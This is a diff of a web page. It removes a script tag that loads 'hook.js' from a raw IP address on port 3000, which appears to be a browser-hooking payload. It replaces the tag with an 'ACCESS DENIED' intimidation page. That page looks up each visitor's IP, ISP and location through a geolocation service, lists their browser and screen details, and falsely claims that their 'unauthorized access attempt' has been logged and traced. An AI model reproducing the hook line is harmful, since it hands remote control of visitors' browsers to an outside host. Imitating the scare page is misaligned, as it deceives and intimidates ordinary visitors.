@@ -1,1 +1,315 @@
-<script src="http://20.197.47.60:3000/hook.js"></script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ACCESS DENIED</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: #000;
+      color: #00ff66;
+      font-family: 'Share Tech Mono', monospace;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow: hidden;
+      flex-direction: column;
+      text-align: center;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+      width: 100%;
+      height: 100%;
+    }
+
+    .content {
+      z-index: 2;
+      padding: 30px;
+      max-width: 95vw;
+      background: rgba(0, 0, 0, 0.85);
+      border: 2px solid #00ff66;
+      border-radius: 10px;
+      box-shadow: 0 0 30px #00ff66, inset 0 0 10px #00ff66;
+      animation: pulse 4s infinite ease-in-out;
+    }
+
+    @keyframes pulse {
+      0%, 100% { box-shadow: 0 0 30px #00ff66, inset 0 0 10px #00ff66; }
+      50% { box-shadow: 0 0 50px #00ff66, inset 0 0 15px #00ff66; }
+    }
+
+    h1 {
+      font-family: 'Roboto Mono', monospace;
+      font-size: 4em;
+      margin-bottom: 25px;
+      text-shadow: 0 0 15px #00ff66, 0 0 30px #00ff66;
+      position: relative;
+      animation: glitch-top 1s infinite, glitch-bottom 1.5s infinite;
+    }
+
+    h1::before, h1::after {
+      content: 'ACCESS DENIED';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+    }
+
+    h1::before {
+      color: #ff00ff;
+      animation: glitch-top 1s infinite;
+      clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%);
+    }
+
+    h1::after {
+      color: #00ffff;
+      animation: glitch-bottom 1.5s infinite;
+      clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%);
+    }
+
+    @keyframes glitch-top {
+      0%, 100% { transform: translate(2px, -2px); }
+      20% { transform: translate(-2px, 2px); }
+      40% { transform: translate(4px, -4px); }
+      60% { transform: translate(-4px, 4px); }
+      80% { transform: translate(2px, -2px); }
+    }
+
+    @keyframes glitch-bottom {
+      0%, 100% { transform: translate(-2px, 2px); }
+      20% { transform: translate(2px, -2px); }
+      40% { transform: translate(-4px, 4px); }
+      60% { transform: translate(4px, -4px); }
+      80% { transform: translate(-2px, 2px); }
+    }
+
+    p {
+      font-size: 1.1em;
+      line-height: 1.6;
+      color: #00ffcc;
+      background: rgba(0, 0, 0, 0.5);
+      padding: 20px;
+      border-radius: 6px;
+      border: 1px dashed #00ffcc;
+      white-space: pre-line;
+      animation: typing 3s steps(40, end);
+      overflow: hidden;
+    }
+
+    @keyframes typing {
+      from { width: 0; }
+      to { width: 100%; }
+    }
+
+    .trace {
+      margin-top: 20px;
+      font-size: 1em;
+      color: #ff0000;
+      font-weight: bold;
+      text-shadow: 0 0 10px #ff0000;
+      animation: flicker 0.5s infinite alternate;
+    }
+
+    @keyframes flicker {
+      0% { opacity: 0.7; }
+      100% { opacity: 1; }
+    }
+
+    .datetime {
+      margin-top: 15px;
+      font-size: 0.9em;
+      color: #00ffcc;
+      background: rgba(0, 0, 0, 0.5);
+      padding: 10px;
+      border-radius: 4px;
+      border: 1px solid #00ff66;
+    }
+
+    .footer {
+      position: fixed;
+      bottom: 15px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 2.5em;
+      color: #fff;
+      font-family: 'Roboto Mono', monospace;
+      font-weight: bold;
+      z-index: 9999;
+      background: rgba(255, 0, 0, 0.8);
+      padding: 8px 15px;
+      border-radius: 6px;
+      box-shadow: 0 0 20px #ff0000;
+      animation: fadeInOut 2s infinite;
+    }
+
+    @keyframes fadeInOut {
+      0%, 100% { opacity: 0.5; transform: translateX(-50%) scale(0.95); }
+      50% { opacity: 1; transform: translateX(-50%) scale(1); }
+    }
+
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      h1 { font-size: 2.5em; }
+      .footer { font-size: 1.8em; padding: 6px 10px; }
+      p { font-size: 1em; }
+      .content { padding: 20px; }
+      .datetime { font-size: 0.8em; }
+    }
+
+    @media (max-width: 480px) {
+      h1 { font-size: 2em; }
+      .footer { font-size: 1.4em; padding: 4px 8px; }
+      p { font-size: 0.9em; }
+      .content { padding: 15px; }
+      .datetime { font-size: 0.7em; }
+    }
+  </style>
+</head>
+<body>
+  <canvas id="matrix"></canvas>
+  <canvas id="particles"></canvas>
+
+  <div class="content">
+    <h1>ACCESS DENIED</h1>
+    <p id="info">Gathering intrusion details...</p>
+    <div class="trace">⚠ Unauthorized access attempt logged and traced.</div>
+    <div class="datetime" id="datetime">Current Time: Loading...</div>
+  </div>
+
+  <div class="footer">
+    Email: tracefade@proton.me
+  </div>
+
+  <script>
+    // Matrix Animation
+    const matrixCanvas = document.getElementById('matrix');
+    const matrixCtx = matrixCanvas.getContext('2d');
+    matrixCanvas.height = window.innerHeight;
+    matrixCanvas.width = window.innerWidth;
+    const letters = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    const fontSize = 14;
+    const columns = matrixCanvas.width / fontSize;
+    const drops = Array.from({ length: columns }).map(() => ({
+      y: Math.random() * matrixCanvas.height,
+      speed: Math.random() * 5 + 2
+    }));
+
+    function drawMatrix() {
+      matrixCtx.fillStyle = "rgba(0, 0, 0, 0.05)";
+      matrixCtx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
+      drops.forEach((drop, i) => {
+        const text = letters[Math.floor(Math.random() * letters.length)];
+        matrixCtx.fillStyle = `hsl(${Math.random() * 60 + 100}, 100%, 50%)`;
+        matrixCtx.font = `${fontSize}px monospace`;
+        matrixCtx.fillText(text, i * fontSize, drop.y);
+        drop.y += drop.speed;
+        if (drop.y * fontSize > matrixCanvas.height && Math.random() > 0.975) {
+          drop.y = 0;
+          drop.speed = Math.random() * 5 + 2;
+        }
+      });
+    }
+
+    // Particle Animation
+    const particleCanvas = document.getElementById('particles');
+    const particleCtx = particleCanvas.getContext('2d');
+    particleCanvas.height = window.innerHeight;
+    particleCanvas.width = window.innerWidth;
+    const particles = Array.from({ length: 100 }).map(() => ({
+      x: Math.random() * particleCanvas.width,
+      y: Math.random() * particleCanvas.height,
+      radius: Math.random() * 2 + 1,
+      vx: Math.random() * 2 - 1,
+      vy: Math.random() * 2 - 1
+    }));
+
+    function drawParticles() {
+      particleCtx.fillStyle = "rgba(0, 0, 0, 0.1)";
+      particleCtx.fillRect(0, 0, particleCanvas.width, particleCanvas.height);
+      particles.forEach(p => {
+        particleCtx.beginPath();
+        particleCtx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+        particleCtx.fillStyle = `rgba(0, 255, 102, ${Math.random() * 0.5 + 0.2})`;
+        particleCtx.fill();
+        p.x += p.vx;
+        p.y += p.vy;
+        if (p.x < 0 || p.x > particleCanvas.width) p.vx *= -1;
+        if (p.y < 0 || p.y > particleCanvas.height) p.vy *= -1;
+      });
+    }
+
+    // Animation Loop
+    function animate() {
+      drawMatrix();
+      drawParticles();
+      requestAnimationFrame(animate);
+    }
+    animate();
+
+    // Date and Time Update
+    function updateDateTime() {
+      const now = new Date();
+      const options = {
+        weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
+        hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
+      };
+      document.getElementById('datetime').textContent = `Current Time: ${now.toLocaleString('en-US', options)}`;
+    }
+    setInterval(updateDateTime, 1000);
+    updateDateTime();
+
+    // Visitor Info with Typing Effect
+    async function getVisitorInfo() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        const info = `
+🔒 IP Address: ${data.ip}
+🌐 ISP: ${data.org || 'Unknown'}
+📍 Location: ${data.city}, ${data.region}, ${data.country_name}
+🕒 Timezone: ${data.timezone}
+💻 OS: ${navigator.platform}
+🌍 Browser: ${navigator.userAgent}
+🖥 Screen: ${screen.width}x${screen.height}
+⚠ Unauthorized access attempt logged at ${new Date().toLocaleString()}
+        `;
+        let i = 0;
+        const speed = 50;
+        document.getElementById('info').textContent = '';
+        function type() {
+          if (i < info.length) {
+            document.getElementById('info').textContent += info.charAt(i);
+            i++;
+            setTimeout(type, speed);
+          }
+        }
+        type();
+      } catch {
+        document.getElementById('info').textContent = 'Unable to fetch visitor details. Intrusion logged locally.';
+      }
+    }
+    getVisitorInfo();
+
+    // Handle window resize
+    window.addEventListener('resize', () => {
+      matrixCanvas.height = window.innerHeight;
+      matrixCanvas.width = window.innerWidth;
+      particleCanvas.height = window.innerHeight;
+      particleCanvas.width = window.innerWidth;
+    });
+  </script>
+</body>
+</html>
